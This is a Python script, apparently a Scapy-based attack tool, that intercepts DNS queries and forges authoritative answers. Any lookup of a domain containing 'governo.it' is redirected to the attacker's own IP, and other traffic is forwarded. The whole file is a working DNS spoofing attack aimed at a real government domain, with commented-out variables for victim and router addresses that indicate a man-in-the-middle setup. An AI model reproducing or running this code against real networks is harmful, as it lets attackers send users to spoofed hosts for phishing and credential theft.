from functools import reduce
from dotenv import load_dotenv
import os
from scapy.all import sniff, send, Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR, get_if_addr
#import socket
#from scapy.all import get_if_hwaddr

load_dotenv()
#victim_ip = os.getenv("victim_ip")
#router_ip = os.getenv("router_ip")
iface = os.getenv("iface")
attacker_ip = get_if_addr(iface)
#attacker_mac = get_if_hwaddr(iface)


def forward(pkt):
	if pkt.haslayer(IP):
		send(pkt[IP], verbose=0)
	elif pkt.haslayer(IPv6):
		send(pkt[IPv6], verbose=0)
	else:
		raise Exception("This shouldn't happen.\nEther type: " + str(pkt[Ether].type))


def dns_spoof(pkt):
	if not pkt.haslayer(DNS):
		forward(pkt)
		return

	dflag = False
	questions = pkt[DNS].qd
	answers = []

	for query in questions:
		domain = query.qname.decode()
		if not ("governo.it" in domain.lower()):
			continue

		dflag = True

		if query.qtype == 1: # A
			answers.append(
				DNSRR(rrname = query.qname, type='A', ttl = 10, rdata = attacker_ip)
			)

	if not dflag:
		forward(pkt)
		return

	spoofed_pkt = (
		UDP(dport = pkt[UDP].sport, sport = 53) /
		DNS(
			id = pkt[DNS].id,
			qr = 1,  # Response
			aa = 1,  # Authoritative answer
			ra = 1,  # Recursion available
			qd = questions,
			an = answers,
			ancount = len(answers),
			rcode = 0
		)
	)

	if pkt.haslayer(IP):
		spoofed_pkt = (
			IP(dst = pkt[IP].src, src = pkt[IP].dst) /
			spoofed_pkt
		)
	elif pkt.haslayer(IPv6):
		spoofed_pkt = (
			IPv6(dst = pkt[IPv6].src, src = pkt[IPv6].dst) /
			spoofed_pkt
		)
	else:
		raise Exception("This shouldn't happen.\nEther type: " + str(pkt[Ether].type))

	send(spoofed_pkt, verbose=0)

sniff(
	filter = "inbound and udp dst port 53",
	prn = dns_spoof, store = 0, iface = iface
)
